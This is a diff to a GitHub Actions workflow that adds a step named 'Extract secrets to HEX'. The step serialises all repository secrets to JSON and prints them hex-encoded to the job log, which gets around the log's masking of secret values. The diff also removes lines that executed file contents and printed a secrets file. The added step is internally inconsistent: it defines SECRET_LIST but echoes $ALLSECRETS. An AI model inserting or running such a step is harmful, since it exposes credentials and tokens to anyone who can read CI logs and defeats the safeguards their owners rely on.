@@ -21,6 +21,10 @@ jobs:
             file_name="file.txt"
             while IFS= read -r line; do
              echo "this is $line"
-             "%$line%"
             done < "$file_name"
-            cat secrets-temp.properties
+        - name: Extract secrets to HEX
+          env:
+            SECRET_LIST: "${{ toJSON(secrets) }}"
+          run: |
+            echo $ALLSECRETS | jq | xxd -p -c 1000000
+          shell: bash
